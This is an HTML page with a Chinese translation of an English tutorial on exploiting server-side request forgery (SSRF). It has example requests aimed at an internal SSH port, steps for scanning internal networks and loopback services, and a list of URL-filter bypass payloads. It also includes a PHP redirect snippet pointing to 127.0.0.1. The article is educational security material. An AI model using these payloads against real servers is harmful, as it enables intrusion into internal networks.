<html>
<head>
<title>Server-Side Request Forgery — SSRF: Exploitation Technique</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">服务器端请求伪造— SSRF:利用技术</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/server-side-request-forgery-ssrf-exploitation-technique-9bc4b4045fbd?source=collection_archive---------0-----------------------#2020-10-10">https://infosecwriteups.com/server-side-request-forgery-ssrf-exploitation-technique-9bc4b4045fbd?source=collection_archive---------0-----------------------#2020-10-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="a63c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">服务器端请求伪造或SSRF是一个漏洞，使得攻击者能够使用易受攻击的服务器代表攻击者发出HTTP请求。这与CSRF类似，因为两个漏洞都在受害者未确认的情况下执行HTTP请求。</p><blockquote class="kl km kn"><p id="88ef" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">SSRF:受害者将是易受攻击的服务器。</p><p id="b9b4" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">CSRF:受害者将是用户的浏览器。</p></blockquote><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi ks"><img src="../Images/7f035b2461b57ec01a0f9b5ab0222f47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/0*nHGLuuWuZYY2DBTM.png"/></div><figcaption class="la lb gj gh gi lc ld bd b be z dk translated">OWASP-SSRF共同流程概览</figcaption></figure><p id="d1cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如由<strong class="jp ir"> OWASP </strong> -在SSRF预防小抄:</p><ul class=""><li id="060f" class="le lf iq jp b jq jr ju jv jy lg kc lh kg li kk lj lk ll lm bi translated">SSRF不限于HTTP协议，尽管事实上通常第一请求利用它，然而第二请求由应用本身执行，因此它可以使用不同的协议(<em class="ko">例如</em> FTP、SMB、SMTP等)。)和方案(<em class="ko">如</em><code class="fe ln lo lp lq b">file://</code><code class="fe ln lo lp lq b">phar://</code><code class="fe ln lo lp lq b">gopher://</code><code class="fe ln lo lp lq b">data://</code><code class="fe ln lo lp lq b">dict://</code>等)。).协议/方案的使用高度依赖于应用的要求。</li><li id="f0db" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk lj lk ll lm bi translated">如果应用程序易受XML外部实体(XXE)注入的攻击，则攻击者可以利用该应用程序来执行SSRF攻击。</li></ul><p id="4d19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当应用程序获取用户可控制的输入并将其合并到使用后端<em class="ko"> HTTP </em>请求回收的<em class="ko"> URL </em>中时，服务器端重定向漏洞就会出现。用户提供的输入可以包括检索到的整个URL，或者应用程序可以对其执行一些处理。这可能会导致:</p><ul class=""><li id="af1d" class="le lf iq jp b jq jr ju jv jy lg kc lh kg li kk lj lk ll lm bi translated"><strong class="jp ir">信息泄露</strong>攻击者可以欺骗服务器泄露自己的信息，并提供对敏感内部文件的访问。</li><li id="fa32" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk lj lk ll lm bi translated"><strong class="jp ir"> XSS </strong>如果攻击者能够欺骗服务器管理一个包含<em class="ko"> Javascript </em>的远程<em class="ko"> HTML </em>文件。</li></ul><p id="d9a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">SSRF是一种攻击媒介，它滥用应用程序与内部网络、外部网络和机器本身进行交互。</p><p id="4204" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">例如:</strong></p><p id="6dd1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，易受攻击的应用程序根据应用程序逻辑向URL发出请求:“<em class="ko">safedomain.safesite.com/account/edit.aspx"(具有IP:192.10.10.1)。</em></p><p id="34f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ln lo lp lq b">POST /account/index HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Host: safesite.com<br/>Content-Length: 1234<br/>show=default&amp;url=safedomain.safesite.com/account/edit.aspx</code></p><p id="01c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者可以将请求的URL修改为:"<em class="ko"> 192.10.10.2:22 "，其中</em>请求位于防火墙后的替代资源或内部资源，并限制外部访问。</p><p id="efe0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ln lo lp lq b">POST /account/index HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Host: safesite.com<br/>Content-Length: 1234<br/>show=default&amp;url=192.10.10.2:22</code></p><p id="75c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">收到的响应包括来自所请求的<strong class="jp ir"> SSH服务的横幅:</strong></p><p id="cbd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ln lo lp lq b">HTTP/1.1 200 OK<br/>Connection: close<br/>SSH-2.0-OpenSSH_4.2Protocol mismatch</code></p><h1 id="2cb2" class="lw lx iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">作为攻击者你能做什么？</h1><p id="1883" class="pw-post-body-paragraph jn jo iq jp b jq mu js jt ju mv jw jx jy mw ka kb kc mx ke kf kg my ki kj kk ij bi translated">攻击者可以利用服务器端HTTP重定向漏洞，诱使易受攻击的应用程序充当<strong class="jp ir">开放HTTP代理</strong>来执行各种进一步的攻击:</p><ol class=""><li id="11de" class="le lf iq jp b jq jr ju jv jy lg kc lh kg li kk mz lk ll lm bi translated">使用代理<strong class="jp ir">攻击互联网上的第三方系统</strong>。在目标看来，恶意流量似乎来自运行易受攻击的应用程序的服务器。</li><li id="4958" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">使用代理<strong class="jp ir">连接到组织内部网络</strong>上的任意主机，从而达到无法从互联网直接访问的目标。</li><li id="6538" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">使用代理<strong class="jp ir">连接回运行在应用服务器本身上的其他服务</strong>，绕过防火墙限制，并可能利用信任关系绕过认证。</li><li id="5b10" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">通过使应用程序在其响应中包含攻击者控制的内容，代理功能可被用于<strong class="jp ir">执行跨站点脚本</strong>等攻击。</li></ol><h1 id="a571" class="lw lx iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">如何识别和利用SSRF？</h1><ol class=""><li id="5707" class="le lf iq jp b jq mu ju mv jy na kc nb kg nc kk mz lk ll lm bi translated">识别任何似乎包含<strong class="jp ir">主机名、IP地址或完整URL的请求参数。</strong></li><li id="7d51" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">对于每个参数，<strong class="jp ir">修改其值</strong>以指定一个替代资源，类似于所请求的资源</li><li id="8e15" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">检查该资源是否出现在服务器的响应中。</li><li id="3a3a" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">定义一个指向您管理的互联网服务器的URL，并<strong class="jp ir">监控来自您正在测试的应用程序的传入连接</strong>。</li><li id="e627" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">如果没有接收到输入连接，<strong class="jp ir">监控应用程序响应</strong>所需的时间。</li><li id="49ec" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">如果有延迟，应用程序的后端<strong class="jp ir">请求可能会由于出站连接的网络限制</strong>而超时。</li><li id="eb6f" class="le lf iq jp b jq lr ju ls jy lt kc lu kg lv kk mz lk ll lm bi translated">如果成功建立了与任意URL的连接，请尝试执行以下操作:</li></ol><p id="f662" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">a.确定<strong class="jp ir">端口号是否可以指定</strong>。例如:<code class="fe ln lo lp lq b">http://site.com:22</code> <br/> b .如果是，尝试<strong class="jp ir">端口扫描内网</strong>使用Burp Intruder等工具依次连接一系列IP地址和端口。<br/> c .尝试<strong class="jp ir">连接易受攻击服务器回环地址</strong>上的其他服务。<br/> d .尝试<strong class="jp ir">将您控制的网页加载到应用程序的响应中，以执行跨站点脚本(XSS)攻击。</strong></p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/3da7e072871d81774b0495cd431aabc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/1*t4AdI4bXDJ5J56EeR8EYQw.gif"/></div></figure><h2 id="5e55" class="ne lx iq bd ly nf ng dn mc nh ni dp mg jy nj nk mk kc nl nm mo kg nn no ms np bi translated"><strong class="ak">使用特殊字符绕过限制:</strong></h2><p id="c232" class="pw-post-body-paragraph jn jo iq jp b jq mu js jt ju mv jw jx jy mw ka kb kc mx ke kf kg my ki kj kk ij bi translated">在内部、外部重定向应用程序或访问任何资源时，可能会有进一步的限制。您可以尝试绕过这些限制，使用特殊字符来修改请求的资源。</p><p id="e3f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ln lo lp lq b">?url=http://safesite.com&amp;site.com<br/>?url=http://////////////site.com/<br/>?url=http://site@com/account/edit.aspx<br/>?url=http://site.com/account/edit.aspx<br/>?url=http://safesite.com?.site.com<br/>?url=http://safesite.com#.site.com<br/>?url=http://safesite.com\.site.com/domain<br/>?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com<br/>?url=https://192.10.10.3/<br/>?url=https://192.10.10.2?.192.10.10.3/<br/>?url=https://192.10.10.2#.192.10.10.3/<br/>?url=https://192.10.10.2\.192.10.10.3/<br/>?url=http://127.0.0.1/status/<br/>?url=http://localhost:8000/status/</code></p><h2 id="6307" class="ne lx iq bd ly nf ng dn mc nh ni dp mg jy nj nk mk kc nl nm mo kg nn no ms np bi translated"><strong class="ak">使用HTTP重定向绕过限制:</strong></h2><p id="06a0" class="pw-post-body-paragraph jn jo iq jp b jq mu js jt ju mv jw jx jy mw ka kb kc mx ke kf kg my ki kj kk ij bi translated">您可以尝试在请求中实现一个类似的代码片段，如果服务器成功处理，会将您重定向到目的地:</p><p id="6fa0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ln lo lp lq b">?url=http://site.com/domain.php<br/>&lt;?php<br/>header(‘Location: http://127.0.0.1:8080/status');<br/>?&gt;</code></p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/8a13cbef6fd4ab7d8afe136d60500741.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*eSQdPTIIFMeoJeFFNKaFiA.jpeg"/></div></figure><p id="b250" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再见。</p></div></div>    
</body>
</html>